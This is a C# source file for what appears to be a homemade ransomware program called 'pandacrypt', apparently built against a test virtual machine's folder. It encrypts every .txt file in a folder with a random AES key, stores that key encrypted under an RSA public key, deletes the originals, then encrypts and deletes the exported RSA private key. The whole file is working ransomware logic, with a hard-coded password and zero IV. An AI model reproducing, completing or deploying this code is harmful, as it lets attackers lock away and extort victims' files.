using System;
using System.Security.Cryptography;
using System.Text;

namespace pandacrypt
{
    class pandacrypt
    {
        private static byte[] IV = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
        public static void Main(string[] args)
        {


           
            string plainPath = @"C:\Users\IEUser\Documents\test";

            RsaEncryption rsa = new RsaEncryption();
            RSACryptoServiceProvider csp = new RSACryptoServiceProvider();
            AesTextEncryption aes = new AesTextEncryption();

            

            //Console.WriteLine(aes.Decrypt(rsa.GetPrivateKey(), "qwertyuiopasdfgh", IV));
            //rsa.GetPrivateKey();
            
            string pemPath = @"C:\Users\IEUser\source\repos\PandaCrypt\pandacrypt\pandacrypt\publickey.pem";
            string pemContent = File.ReadAllText(pemPath);
            csp.ImportFromPem(pemContent);


            foreach (string f in Directory.GetFiles(plainPath))
            {
                string encryptedFile = f.Replace(".txt", ".panda");
                string Key = CreatePassword(30);

                EncryptFiles(f, Key, encryptedFile);

                string fName = Path.GetFileName(f).Replace(".txt", "");
                string fKey = $"{fName} AESKEY";
                string KeyFilePath = $@"{plainPath}\{fKey}.txt";
                string encryptedKey = rsa.Encrypt(Key).ToString();
                File.WriteAllText(KeyFilePath, encryptedKey);
                File.Delete(f);

            }

            StreamWriter output = File.CreateText(@"C:\Users\IEUser\Documents\test\clientprivatekey.txt");
            rsa.exportPriv(output);
            output.Close();

            string CPKeypath = @"C:\Users\IEUser\Documents\test\clientprivatekey.txt";
            string shordCPKey = CPKeypath.Replace(".txt", ".panda");

            EncryptFiles(@"C:\Users\IEUser\Documents\test\clientprivatekey.txt", "password", shordCPKey);
            string NewKey = CreatePassword(30);
            string Name = Path.GetFileName(CPKeypath).Replace(".txt", "");
            string NewencryptedKey = $"{Name} AESKEY";
            string NewKeyFilePath = $@"{plainPath}\{NewencryptedKey}.txt";
            var data = Encoding.UTF8.GetBytes(NewKey);
            var cypher = csp.Encrypt(data, false);
            File.WriteAllText(NewKeyFilePath, Convert.ToBase64String(cypher));
            File.Delete(CPKeypath);






        }


        private static void EncryptFiles(string plaintext, string AesKey, string encrypted)
        {
            SharpAESCrypt.SharpAESCrypt.Encrypt(AesKey, plaintext, encrypted);
        }
        private static string CreatePassword(int length)
        {
           
            const string valid_all = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_-=+{}:;\\<>?|,./`~[]'";
           
                StringBuilder res = new StringBuilder();
                byte[] random = new byte[1];
                RNGCryptoServiceProvider rProvider = new RNGCryptoServiceProvider();
                while (0 < length--)
                {
                    rProvider.GetBytes(random);
                    res.Append(valid_all[random[0] % (valid_all.Length - 1)]);
                }
                return res.ToString();
            
        }


    }
}

